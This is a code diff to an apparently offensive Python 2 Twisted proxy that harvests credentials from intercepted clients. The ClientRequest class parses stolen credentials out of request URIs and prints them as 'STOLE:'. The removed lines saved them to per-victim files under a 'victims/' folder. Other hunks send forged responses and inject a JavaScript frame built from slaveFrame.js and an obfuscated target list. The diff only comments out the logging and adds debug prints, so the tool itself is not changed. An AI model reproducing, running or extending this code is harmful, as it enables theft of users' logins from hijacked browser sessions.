@@ -17,7 +17,6 @@ from DnsCache import DnsCache
 
 class ClientRequest(Request):
 
-
     def __init__(self, channel, queued, reactor=reactor):
         Request.__init__(self, channel, queued)
         self.reactor       = reactor
@@ -74,11 +73,11 @@ class ClientRequest(Request):
         uri=uri.split("|||||")
 
         try:
-           clientFile = open("victims/"+client,'a+')
+           # clientFile = open("victims/"+client,'a+')
            for cred in uri:
-              clientFile.write(cred[1:]+"\n")
+              #clientFile.write(cred[1:]+"\n")
               print "STOLE: "+cred[1:]
-           clientFile.close()
+           #clientFile.close()
 
         except IOError as (errno, strerror):
            print "IO Error"
@@ -86,6 +85,7 @@ class ClientRequest(Request):
 
     def handleHostResolvedSuccess(self, address):
         logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))
+
 
         host              = self.getHeader("host")
         client            = self.getClientIP()
@@ -122,6 +122,7 @@ class ClientRequest(Request):
            path = path[:tmp-1]
            if(len(path) > 1):
               host += path
+	   print "host: "+host
            self.sendForgery(host) 
            return
 
@@ -150,16 +151,16 @@ class ClientRequest(Request):
         address = self.dnsCache.getCachedAddress(host)
 
         if address != None:
-            logging.debug("Host cached.")
+	    logging.debug("Host cached.")
             return defer.succeed(address)
         else:
             logging.debug("Host not cached.")
             return reactor.resolve(host)
 
     def process(self):
-
         host     = self.getHeader('host') 
-        path     = self.getPathFromUri()           
+        path     = self.getPathFromUri()   
+        
         if("slaveFrame.js" in path):
            self.sendMaster()
         else:
@@ -221,6 +222,7 @@ class ClientRequest(Request):
 
         
     def sendWrapUp(self):
+	print "DONE!!!"
         self.setResponseCode(200, "OK")
         self.setHeader("Connection", "close") 
         self.write("<html><head><script type=\"text/javascript\">window.parent.postMessage(\"destroy masterFrame\",\"*\")</script></head><body></body></html>")    
@@ -255,8 +257,8 @@ class ClientRequest(Request):
         
         js = open("slaveFrame.js",'r+')
         frame =  "<html><head><script type=\"text/javascript\">var targets=["+obfuscatedTargets+"];"+js.read() + "</script></head><body onload=\"init();\"></body></html>"
+
         js.close()
-        
         self.write(frame)
         
         self.finish()
